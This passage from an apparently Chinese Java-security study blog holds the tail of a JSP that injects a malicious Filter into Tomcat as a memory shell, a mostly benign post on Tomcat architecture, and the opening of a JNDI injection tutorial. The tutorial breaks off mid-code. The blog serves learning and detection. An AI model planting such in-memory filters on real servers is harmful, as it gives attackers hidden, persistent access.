class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig1</span> <span class="operator">=</span> (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向从StandardContext获取的FilterConfigs中添加恶意的FilterConfig</span></span><br><span class="line">        filterConfigsMap.put(filterName, applicationFilterConfig1);</span><br><span class="line">        out.println(<span class="string">&quot;Filter Inject Successfully...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/12.png"></p><h2 id="Check-MemoryShell"><a href="#Check-MemoryShell" class="headerlink" title="Check MemoryShell"></a>Check MemoryShell</h2><p>这里先mark几款工具，后续对内存马查杀进行进一步的学习：</p><ul><li><a href="https://github.com/alibaba/arthas">Arthas</a></li><li><a href="https://github.com/LandGrey/copagent">Copagent</a></li><li><a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a></li><li><a href="https://github.com/4ra1n/shell-analyzer">shell-analyzer</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Architecture Analysis</title>
      <link href="/2024/05/18/Tomcat-Architecture-Analysis/"/>
      <url>/2024/05/18/Tomcat-Architecture-Analysis/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Apache Tomcat软件是Java Servlet、JavaServer Pages、Java Expression Language和Java WebSocket技术的一个开源实现。Java Servlet、JavaServer Pages、Java Expression Language和Java WebSocket规范是在Java Community Process下开发的。</p><p>简单来说，Tomcat可以看成是Web服务器加Servlet容器。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/1.png"></p><p>在上面的流程图中，Tomcat通过Connector组件接收并解析HTTP请求，将ServletRequest对象发送给Container进行处理。Container处理完成后会将响应封装成ServletRespone对象返回给Connector，然后Connector再将ServletRespone对象解析成HTTP响应文本格式发送给客户端，至此Tomcat就完成了一次网络通信。</p><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/2.png"></p><p>在Tomcat架构图中主要包含三个组件：Service、Connectot、Container。</p><ul><li>Server：Web服务器，一个Server中可以包含多个Service。</li><li>Service：每一个Service都是独立的，它们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。</li><li>Connector：Connector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP&#x2F;1.1、HTTP&#x2F;2、AJP等等。</li><li>Container：Tomcat的Container包含四种子容器，分别为Engine、Host、Context和Wrapper。其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，一个Context又包含多个Wrapper。<ul><li>Engine：可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。</li><li>Host：可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。虚拟主机的作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们，每个虚拟主机对应的一个域名，不同Host容器接受处理对应不同域名的请求。</li><li>Context：上下文容器，可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格或斜杠。</li><li>Wrapper：对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet，每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理Servlet，包括Servlet的装载、初始化、执行以及资源回收。</li></ul></li></ul><p>下图展示了请求在Container中的解析过程：</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/3.png"></p><h2 id="Three-Major-Components"><a href="#Three-Major-Components" class="headerlink" title="Three Major Components"></a>Three Major Components</h2><p>Java Web中有三大组件，分别是Servlet、Filter和Listener。三者的加载顺序为Listener-&gt;Filter-&gt;Servlet。</p><p>在org.apache.catalina.core.StandardContext类的startInternal方法中，首先调用了listenerStart，接着是filterStart，最后是loadOnStartup。这三处调用分别触发了Listener、Filter、Servlet的构造加载。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/4.png"></p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="Conception"><a href="#Conception" class="headerlink" title="Conception"></a>Conception</h4><p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p><p>与Listener相关的概念：</p><ul><li>事件：某个方法被调用，或者属性的改变；</li><li>事件源：被监听的对象（如ServletContext、requset、方法等）；</li><li>监听器：用于监听事件源，当发生事件时会触发监听器。</li></ul><p>监听器分类：</p><table><thead><tr><th align="center">事件源</th><th align="center">监听器</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ServletContext</td><td align="center">ServletContextListener</td><td align="center">用于监听 ServletContext 对象的创建与销毁过程</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionListener</td><td align="center">用于监听 HttpSession 对象的创建和销毁过程</td></tr><tr><td align="center">ServletRequest</td><td align="center">ServletRequestListener</td><td align="center">用于监听 ServletRequest 对象的创建和销毁过程</td></tr><tr><td align="center">ServletContext</td><td align="center">ServletContextAttributeListener</td><td align="center">用于监听 ServletContext 对象的属性新增、移除和替换</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionAttributeListener</td><td align="center">用于监听 HttpSession 对象的属性新增、移除和替换</td></tr><tr><td align="center">ServletRequest</td><td align="center">ServletRequestAttributeListener</td><td align="center">用于监听 HttpServletRequest 对象的属性新增、移除和替换</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionBindingListener</td><td align="center">用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td></tr><tr><td align="center">HttpSession</td><td align="center">HttpSessionActivationListener</td><td align="center">用于监听 HttpSession 中对象活化和钝化的过程</td></tr></tbody></table><p>按照监听的对象不同将其划分为三类：ServletContextListener，HttpSessionListener和ServletRequestListener。</p><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul><li>ServletContextListener配置</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.memoryshell.tomcatmemoryshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext对象创建...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext对象销毁...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>web.xml配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;5.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.memoryshell.tomcatmemoryshell.MemoryListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/9.png"></p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><h4 id="Conception-1"><a href="#Conception-1" class="headerlink" title="Conception"></a>Conception</h4><p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。</p><h4 id="Life-Cycle"><a href="#Life-Cycle" class="headerlink" title="Life Cycle"></a>Life Cycle</h4><p>Filter的生命周期分为三个阶段：</p><ul><li>初始化阶段：Filter的初始化阶段只会在Web应用程序启动时调用一次。</li><li>拦截和过滤阶段：当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器。</li><li>销毁阶段：Filter的销毁阶段只会在web应用移除或服务器停止时才调用一次来卸载Filter对象。</li></ul><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/6.png"></p><h4 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h4><ul><li>FilterChain</li></ul><p>一个Servlet可以注册多个Filter，Web容器会将注册的多个Filter组合成一个”Filter链”，并按照一定的顺序依次执行各Filter的doFilter方法。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/7.png"></p><ul><li>Filter execution sequence</li></ul><p>由于Filter的注册方式不同，其执行顺序也有所不同。</p><ol><li>基于注解配置：按照类名的字符串比较规则比较，值小的先执行；</li><li>使用web.xml配置：根据对应的Mapping的顺序组织，谁定义在上边谁就在前。</li></ol><ul><li>FilterConfig</li></ul><p>和Servlet类似，由于Filter也有可能访问Servlet，所以Servlet规范将代表ServletContext对象和Filter的配置参数信息都封装到一个称为FilterConfig的对象中。</p><p>FilterConfig接口则用于定义FilterConfig对象应该对外提供的方法，以便在Filter的doFilter方法中可以调用这些方法来获取ServletContext对象，以及获取在web.xml文件中的一些初始化参数。</p><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/8.png"></p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><h4 id="Conception-2"><a href="#Conception-2" class="headerlink" title="Conception"></a>Conception</h4><p>Servlet是运行在Web服务器或应用服务器上的程序，它是作为来自HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。用来处理客户端请求的动态资源，并根据请求生成相应的返回信息提供给用户，当Tomcat接收到来自客户端的请求时，会将其解析成RequestServlet对象并发送到对应的Servlet上进行处理。</p><h4 id="Life-Cycle-1"><a href="#Life-Cycle-1" class="headerlink" title="Life Cycle"></a>Life Cycle</h4><p>Servlet的生命周期分为五个阶段：</p><ul><li>加载阶段：当Tomcat第一次访问Servlet时，会创建Servlet的实例。</li><li>初始化阶段：当Servlet实例化后，Tomcat会调用init方法初始化这个对象。</li><li>处理服务阶段：当浏览器访问Servlet时，Servlet会调用service方法处理请求。</li><li>销毁阶段：当Tomcat关闭时或者检测到Servlet要从Tomcat删除时，会自动调用destroy方法，让该实例释放掉所占的资源。除此之外，一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁。</li><li>卸载阶段：当Servlet调用完destroy方法后，会等待垃圾回收。如果有需要再次使用这个Servlet时，会重新调用init方法进行初始化操作。</li></ul><p><img src="/2024/05/18/Tomcat-Architecture-Analysis/5.png"></p><h4 id="Usage-2"><a href="#Usage-2" class="headerlink" title="Usage"></a>Usage</h4><p>根据上文对Servlet生命周期的了解，当需要实现一个Servlet时，需要继承Servlet接口，并实现相应的五个方法。</p><p>在Tomcat中已经封装好了两个类，分别是GenericServlet类和HttpServlet类。GenericServlet抽象类实现了Servlet接口，并对Servlet接口中除service方法外的其它四个方法进行了简单实现。</p><p>通过继承GenericServlet类创建来Servlet，只需要重写service方法即可。但是，GenericServlet抽象类是一个通用的Servlet类，并不是针对某种应用场景而设计的，因此在处理HTTP请求的时候需要手动实现对HTTP请求的解析和封装。</p><p>HttpServlet是GenericServlet的子类，它在GenericServlet的基础上专门针对HTTP协议进行了处理。其针对每一种HTTP请求都设置了一种处理方法。当使用HttpServlet类的时候，只需要根据HTTP请求类型重写相应的处理方法即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;MemoryServlet&quot;, value = &quot;/MemoryServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        message = <span class="string">&quot;This is MemoryShell page!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://goodapple.top/archives/1359">Java安全学习——Tomcat架构浅析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><font style="color:#000000;">Java Naming and Directory Interface（JNDI）是一种Java API，</font><strong><font style="color:#000000;">JNDI为利用Java编写的应用程序提供命名和目录接口功能</font></strong><font style="color:#000000;">，JNDI不仅限于context.xml等应用程序服务器中的配置；相反，它是一个用于访问命名和目录服务的更广泛的API。</font></p><p><font style="color:#000000;">JNDI允许Java软件客户端通过名称发现和查找数据和对象，这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI）、公共对象请求代理体系结构（CORBA）、轻量级目录访问协议（LDAP）或域名服务（DNS）。</font><strong><font style="color:#000000;">JNDI可访问的现有的目录及服务包括JDBC、LDAP、RMI、DNS、NIS、CORBA。</font></strong></p><h3 id="Naming-Service"><a href="#Naming-Service" class="headerlink" title="Naming Service"></a>Naming Service</h3><p><strong><font style="color:#000000;">Naming Service将名称和对象进行关联，提供通过名称找到对象的操作。</font></strong><font style="color:#000000;">例如，DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</font></p><p><font style="color:#000000;">在命名系统中，有几个重要的概念：</font></p><ol><li><font style="color:#000000;">Bindings：表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在DNS中域名绑定到对应的IP，在RMI中远程对象绑定到对应的Name。</font></li><li><font style="color:#000000;">Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，可以在指定上下文中查找名称对应的对象。例如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文（subcontext）。</font></li><li><font style="color:#000000;">References：在一个实际的Naming Service中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为C&#x2F;C++中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数fd（file descriptor），这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</font></li></ol><h3 id="Directory-Service"><a href="#Directory-Service" class="headerlink" title="Directory Service"></a>Directory Service</h3><p><strong><font style="color:#000000;">Directory Service可以被认为是Naming Service的一种拓展，除了Naming Service中已有的名称到对象的关联信息外，还允许对象拥有属性信息。</font></strong><font style="color:#000000;">因此，不仅可以根据名称去查找对象并获取其对应属性，还可以根据属性值去搜索对象。</font></p><p><font style="color:#000000;">以打印机服务为例，可以在Naming Service中根据打印机名称去获取打印机对象，然后进行打印操作；同时打印机拥有速率、分辨率、颜色等属性，作为Directory Service，用户可以根据打印机的分辨率去搜索对应的打印机对象。</font></p><p><font style="color:#000000;">Directory Service提供了对目录中对象（Directory Objects）的属性进行增删改查的操作。常见的Directory Service有：</font></p><ol><li><font style="color:#000000;">LDAP，轻型目录访问协议。</font></li><li><font style="color:#000000;">Active Directory，为Windows域网络设计，包含多个目录服务，比如域名服务、证书服务等。</font></li><li><font style="color:#000000;">其他基于目录服务的标准X.500实现的目录服务。</font></li></ol><h3 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a><font style="color:#000000;">Interface</font></h3><p><font style="color:#000000;">为了方便在JAVA中使用目录协议，JAVA实现了一套目录服务的接口JDNI，即Java提供的Java命名和目录接口，应用通过该接口与具体的目录服务进行交互。从设计上，JNDI独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。</font></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><strong><font style="color:#000000;">JNDI架构上主要包含两个部分，即Java的应用层接口和SPI</font></strong><font style="color:#000000;">（Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装），如下图所示。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730722931873-c05c9d4c-2645-4633-b64e-d9ce5076a493.webp.png"></p><p><font style="color:#000000;">JNDI包含在Java SE平台中，要使用JNDI时，必须要拥有JNDI类和一个或多个服务提供者，JDK包括以下命名或者目录服务的服务提供者：</font></p><ul><li><font style="color:#000000;">DNS，Domain Name Service（域名服务）</font></li><li><font style="color:#000000;">RMI，Java Remote Method Invocation（Java方法远程调用）</font></li><li><font style="color:#000000;">LDAP，Lightweight Directory Access Protocol（轻量级目录访问协议）</font></li><li><font style="color:#000000;">CORBA，Common Object Request Broker Architecture（公共对象请求代理体系结构）</font></li></ul><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><font style="color:#000000;">JNDI接口主要分为如下5个包：</font></p><ol><li><font style="color:#000000;">javax.naming，主要用于命名操作，它包含了命名服务的类和接口，例如Context、Bindings、References、lookup等</font></li><li><font style="color:#000000;">javax.naming.directory，主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</font></li><li><font style="color:#000000;">javax.naming.event，在命名目录服务器中请求事件通知</font></li><li><font style="color:#000000;">javax.naming.ldap，提供LDAP服务支持</font></li><li><font style="color:#000000;">javax.naming.spi，允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</font></li></ol><h3 id="InitialContext"><a href="#InitialContext" class="headerlink" title="InitialContext"></a>InitialContext</h3><p><font style="color:#000000;">InitialContext类是JNDI的一个核心类，实现了Context接口，是所有命名操作的起点。它提供了一个上下文环境，用于相对命名操作。</font></p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Constructs an initial context.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InitialContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    init(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs an initial context with the option of not initializing it.</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">InitialContext</span><span class="params">(<span class="type">boolean</span> lazy)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!lazy) &#123;</span><br><span class="line">        init(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs an initial context using the supplied environment.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InitialContext</span><span class="params">(Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (environment != <span class="literal">null</span>) &#123;</span><br><span class="line">        environment = (Hashtable)environment.clone();</span><br><span class="line">    &#125;</span><br><span class="line">    init(environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleInitialContextDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://a952d10bd0.ipv6.1433.eu.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">            ctx.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><font style="color:#000000;">Reference类也是在javax.naming的一个类，实现了Referenceable接口，用于表示对对象的引用。该类表示对在命名&#x2F;目录系统外部找到的对象的引用，它包含了对象的类名和一组属性，这些属性描述了如何创建和查找对象。</font></p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">className – The non-null class name of the object to which this reference refers.</span></span><br><span class="line"><span class="comment">addr – The non-null address of the object.</span></span><br><span class="line"><span class="comment">factory – The possibly null class name of the object&#x27;s factory.</span></span><br><span class="line"><span class="comment">factoryLocation – The possibly null location from which to load the factory (e. g. URL)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27;.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.className  = className;</span><br><span class="line">    addrs = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27; and an address.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, RefAddr addr)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.className = className;</span><br><span class="line">    addrs = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">    addrs.addElement(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27;, and the class name and location of the object&#x27;s factory.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27;, the class name and location of the object&#x27;s factory, and the address for the object.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, RefAddr addr, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(className, addr);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span 